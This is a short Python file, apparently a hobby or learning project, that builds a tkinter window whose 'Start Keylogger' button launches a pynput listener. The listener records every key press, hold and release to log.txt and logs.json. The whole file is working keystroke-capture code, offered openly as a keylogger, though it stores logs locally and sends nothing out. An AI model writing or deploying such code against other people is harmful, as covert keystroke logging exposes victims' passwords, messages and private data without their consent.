import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

def update_text_file(key):
    with open('log.txt', 'a') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w') as Key_log:
        json.dump(key_list, Key_log)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Pressed': f'{key}'})
        x = True
    else:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    x = False
    update_json_file(key_list)
    key_strokes += str(key)
    update_text_file(str(key))

def butaction():
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

tk.Label(root, text="Keylogger", font='verdana 11 bold').grid(row=2, column=2)
tk.Button(root, text="Start Keylogger", command=butaction).grid(row=5, column=2)
root.mainloop()
